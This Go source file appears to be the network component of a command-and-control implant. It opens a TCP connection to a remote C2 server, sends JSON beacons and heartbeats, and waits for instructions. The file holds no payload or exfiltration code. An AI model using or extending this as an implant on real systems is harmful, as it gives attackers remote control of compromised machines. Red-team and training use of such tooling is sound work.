package main

import (
	"bufio"
	"fmt"
	"net"
	"time"

	"github.com/BradHacker/titan/models"
)

// CreateTCPConnection connects to a remote C@ via TCP
func CreateTCPConnection(remoteHost string, remotePort string) (connection net.Conn, err error) {
	connection, err = net.Dial("tcp", remoteHost+":"+remotePort)
	return
}

// CloseConnection closes an existing net.Conn to the C2
func CloseConnection(connection net.Conn) (err error) {
	err = connection.Close()
	return
}

// SendBeacon sends a beacon response to the C2
func SendBeacon(beacon models.Beacon, connection net.Conn) (err error) {
	beacon.SentAt = time.Now()
	dataBytes, jsonErr := models.EncodeBeacon(beacon)
	if jsonErr != nil {
		return jsonErr
	}
	_, err = connection.Write(append(dataBytes, []byte{0xff}...))
	return
}

// SendHeartbeat sends a beacon response to the C2
func SendHeartbeat(heartbeat models.Heartbeat, connection net.Conn) (err error) {
	heartbeat.SentAt = time.Now()
	dataBytes, jsonErr := models.EncodeHeartbeat(heartbeat)
	if jsonErr != nil {
		return jsonErr
	}
	_, err = connection.Write(append(dataBytes, []byte{0xff}...))
	return
}

// WaitForInstruction waits for the C2 to send an instruction and then decodes the incoming instruction
func WaitForInstruction(connection net.Conn) (instruction models.Instruction, err error) {
	buffer, err := bufio.NewReader(connection).ReadBytes(0xff)
	if err != nil {
		return
	}

	fmt.Println("Decoding instruction...")

	if len(buffer) > 0 {
    buffer = buffer[:len(buffer)-1]
	}

	i, err := models.DecodeInstruction(buffer)
	instruction = *i
	return
}